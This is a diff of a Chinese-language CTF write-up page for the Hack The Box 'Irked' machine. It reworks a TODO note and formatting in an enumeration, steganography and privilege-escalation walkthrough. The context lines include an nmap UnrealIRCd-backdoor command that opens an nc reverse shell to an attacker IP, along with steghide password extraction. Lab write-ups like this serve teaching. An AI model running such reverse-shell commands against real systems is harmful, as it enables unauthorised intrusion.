@@ -183,6 +183,8 @@ function sidebar_toggle() {
           <div class="book-post">
   <h1 id="Irked-Writeup">Irked Writeup</h1>
 <p><img src="./0.png" alt=""></p>
+<h2 id="0x00-TODO">0x00 TODO</h2>
+<p>跑一下 <a target="_blank" rel="noopener" href="http://LinEnum.sh">LinEnum.sh</a> 看下能不能跑出 <code>/home/djmardov/.backup</code> 文件。</p>
 <h2 id="0x01-信息收集">0x01 信息收集</h2>
 <p><img src="./1.png" alt=""></p>
 <h2 id="0x02-枚举">0x02 枚举</h2>
@@ -197,17 +199,13 @@ function sidebar_toggle() {
 <p>unrealircd 后门利用，执行反弹 shell 命令拿到普通用户 <code>ircd</code>权限。</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">nmap -d -p6697 --script<span class="token operator">=</span>irc-unrealircd-backdoor.nse --script-args<span class="token operator">=</span>irc-unrealircd-backdoor.command<span class="token operator">=</span><span class="token string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 10.10.14.21 4444 >/tmp/f &amp;'</span> <span class="token number">10.10</span>.10.117</code></pre>
 <p><img src="./6.png" alt=""><br>
-<code>ircd</code> 并没有 user flag，找到 <code>djmardov</code> 用户 <code>./documents</code>，无权限打开 <code>user.txt</code>，看了 <code>sudo -l</code> 没有可以切换的姿势，在 documents 下 <code>ls -la</code> 发现隐藏文件 <code>.backup，cat</code> 一下是一个 <code>xxx step backup pw</code>，像是某个密码，用来 <code>ssh djmardov@10.10.10.117</code> 不对，于是 google 一下发现跟 <code>stephide</code> 这个工具有关。<br>
-<code>stephide</code> 是用于将<strong>文件隐藏在图片、音频</strong>的工具。</p>
+<code>ircd</code> 并没有 user flag，找到 <code>djmardov</code> 用户 <code>./documents</code>，无权限打开 <code>user.txt</code>，看了 <code>sudo -l</code> 没有可以切换的姿势，在 documents 下 <code>ls -la</code> 发现隐藏文件 <code>.backup</code>，cat 一下是一个 <code>xxx step backup pw</code>，像是某个密码，用来 <code>ssh djmardov@10.10.10.117</code> 不对，于是 google 一下发现跟 <code>stephide</code> 这个工具有关。</p>
+<p><code>stephide</code> 是用于将<strong>文件隐藏在图片、音频</strong>的工具。</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">stephide extract -sf irked.jpg -p password  <span class="token comment"># 提取文件</span>
-steghide embed -ef secret.txt -cf irked.jpg <span class="token comment"># 隐藏文件</span>
+steghide embed -ef secret.txt -cf irked.jpg <span class="token comment"># 隐藏文件，自己要验一下</span>
 <span class="token comment"># 会被提示输入口令</span>
 Enter passphrase:Re-Enter passphrase:embedding <span class="token string">"secret.txt"</span> <span class="token keyword">in</span> <span class="token string">"irked.jpg"</span><span class="token punctuation">..</span>. <span class="token keyword">done</span></code></pre>
-<p>提取出来看到 pass.txt，<code>ssh djmardov@10.10.10.117</code> 登录成功，拿到 <code>user.txt</code></p>
-<blockquote>
-<p>TODO:<br>
-跑一下 <a target="_blank" rel="noopener" href="http://LinEnum.sh">LinEnum.sh</a> 看下能不能跑出这个 .backup 文件。</p>
-</blockquote>
+<p>提取出来看到 pass.txt，<code>ssh djmardov@10.10.10.117</code> 登录成功，拿到 <code>user.txt</code>。</p>
 <h2 id="0x04-提权">0x04 提权</h2>
 <h3 id="1、Apache-JSP-webshell">1、Apache JSP webshell</h3>
 <p>查看 html 目录是否可写，因为这里 apache 是 root 启动，有 webshell 就有 root，但是 /var/www/html 目录不可写。</p>
